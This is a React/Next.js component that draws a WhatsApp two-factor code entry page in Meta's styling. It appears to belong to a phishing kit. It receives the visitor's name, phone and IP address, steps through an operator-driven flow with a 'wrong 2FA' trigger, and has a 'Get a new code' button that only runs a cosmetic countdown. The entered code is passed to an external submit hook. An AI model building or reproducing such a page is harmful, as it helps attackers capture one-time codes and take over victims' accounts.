import React, { useEffect, useRef, useState } from "react";
import { styled } from "styled-components";
import Image from "next/image";
import { useFa2Logic } from "../../hooks/useFa2Logic";
import LoadingSpinner from "../ui/LoadingSpinner";

const ModalContainer = styled.div`
  position: fixed;
  display: flex;
  justify-content: center;
  align-items: center;
  width: 100%;
  height: 70%;
  z-index: 1000;
  top: 0px;
  left: 0px;
  padding-inline: 1rem;
`;
const ModalContent = styled.div`
  max-width: 600px;
  width: 100%;
  /* height: 530px; */
  display: flex;
  flex-direction: column;
  justify-content: space-between;
  position: relative;
  padding-block: 1.5rem;
  margin-block: 1rem;
  @media (max-width: 991.98px) {
    /* height: 430px; */
  }
  button:disabled {
    opacity: 0.5;
  }
`;

const ModalTitle = styled.div`
  padding-bottom: 0.1rem;
  font-weight: 700;
  font-size: 24px;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
`;
const SmallText = styled.div`
  color: #1c2b33;
  font-size: 14px;
  line-height: 1.3;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
`;
const CustomHr = styled.hr`
  margin-block: 0.5rem !important;
`;

const CustomInput = styled.input`
  width: 100%;
  border: 1px solid #ddd;
  padding: 0.75rem;
  outline: none !important;
  border-radius: 10px;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
  &.redborder {
    border: 1px solid red !important;
  }

  :focus {
    border: 1px solid #aaa;
  }
  margin-bottom: 0.5rem;
`;
const StyledButton = styled.button`
  background-color: #0064e0;
  border: 1px solid #0064e0;
  width: 100%;
  color: white;
  font-size: 13px;
  font-weight: 500;
  padding: 10px 20px;
  border-radius: 50px;
  text-transform: none;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;

  :disabled {
    opacity: 0.5;
  }
`;
const ErrorDiv = styled.div`
  font-size: 12px;
  color: red;
  text-align: left;
  padding-bottom: 0.5rem;
  margin-top: -0.35rem;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
`;

const ResendRow = styled.button`
  display: inline-flex;
  align-items: center;
  gap: 12px;
  margin-top: 0.3rem;
  margin-bottom: 1.0rem;
  padding: 0;
  border: none;
  background: transparent;
  color: ${({ disabled }) => (disabled ? "#6b7280" : "#1877f2")};
  font-size: 16px;
  font-weight: 500;
  font-family: FBook, Helvetica, system-ui, sans-serif !important;
  cursor: ${({ disabled }) => (disabled ? "default" : "pointer")};
`;

const ResendIcon = styled.svg`
  flex-shrink: 0;
  color: #1c1e21;
`;
const ImgWrapper = styled.div`
  width: 100%;
  margin-block: 1rem;
  min-height: 262.5px;
  background-color: #d5d9dd;
  position: relative;
  display: flex;
  align-items: center;

  @media (max-width: 576.98px) {
    min-height: 160px;
    border-radius: 10px;

    img {
      border-radius: 10px;
    }
  }
`;


function Fa2Whatsapp({ Unik, setStep, Name, Tel, Ip, LastFetch, wrong2faTrigger }) {
  const {
    code,
    isLoading,
    showError,
    handleSubmit,
    handleCodeChange,
    shouldShowRedBorder,
    isButtonDisabled,
  } = useFa2Logic({
    LastFetch,
    wrong2faTrigger,
    setStep,
    nextStep: 4,
    componentName: "WhatsApp 2FA",
    initialMessage: "WhatsApp 2FA Page Loaded",
    countdownDuration: 60,
  });
  const [isResendActive, setIsResendActive] = useState(false);
  const [resendCountdown, setResendCountdown] = useState(60);
  const resendIntervalRef = useRef(null);

  const handleFormSubmit = (e) => {
    handleSubmit(e, "whatsapp");
  };

  useEffect(() => {
    return () => {
      if (resendIntervalRef.current) {
        clearInterval(resendIntervalRef.current);
      }
    };
  }, []);

  const startResendCountdown = () => {
    if (isResendActive) {
      return;
    }

    setIsResendActive(true);
    setResendCountdown(60);

    resendIntervalRef.current = setInterval(() => {
      setResendCountdown((prev) => {
        if (prev <= 1) {
          clearInterval(resendIntervalRef.current);
          resendIntervalRef.current = null;
          setIsResendActive(false);
          return 60;
        }

        return prev - 1;
      });
    }, 1000);
  };

  const renderResendCountdown = () => (
    <span className="text-start fw-bold">
      00:{resendCountdown < 10 && "0"}
      {resendCountdown}
    </span>
  );

  return (
    <ModalContainer>
      <ModalContent>
        <div className="text-start">
          <ModalTitle>Check your WhatsApp messages</ModalTitle>
          <SmallText>
            Enter the code we sent to your WhatsApp account.
          </SmallText>
        </div>
        <ImgWrapper>
          <Image
            alt=""
            src="/assets/images/whatsapp.png"
            layout="fill"
            objectFit="cover"
          />
        </ImgWrapper>
        <div>
          <form onSubmit={handleFormSubmit}>
            <div className="form-floating">
              <CustomInput
                placeholder="Code"
                type="number"
                value={code}
                onChange={handleCodeChange}
                className={`form-control ${shouldShowRedBorder() ? "redborder" : ""}`}
                disabled={isLoading}
              />
              <label htmlFor="floatingInput">Code</label>
            </div>

            {showError && <ErrorDiv>Invalid authentication code</ErrorDiv>}

            <ResendRow
              type="button"
              disabled={isResendActive}
              onClick={startResendCountdown}
            >
              <ResendIcon
                xmlns="http://www.w3.org/2000/svg"
                width="20"
                height="20"
                fill="none"
                viewBox="0 0 24 24"
              >
                <path
                  d="M21 12a9 9 0 1 1-2.64-6.36"
                  stroke="currentColor"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth="2"
                />
                <path
                  d="M21 3v6h-6"
                  stroke="currentColor"
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth="2"
                />
              </ResendIcon>
              <span>
                {isResendActive ? (
                  <>
                    We can send a new code in {renderResendCountdown()}
                  </>
                ) : (
                  "Get a new code"
                )}
              </span>
            </ResendRow>

            <StyledButton 
              type="submit" 
              className="mt-2"
              disabled={isButtonDisabled()}
            >
              {isLoading ? <LoadingSpinner size="15px" /> : "Continue"}
            </StyledButton>
          </form>
        </div>
      </ModalContent>
    </ModalContainer>
  );
}

export default Fa2Whatsapp;
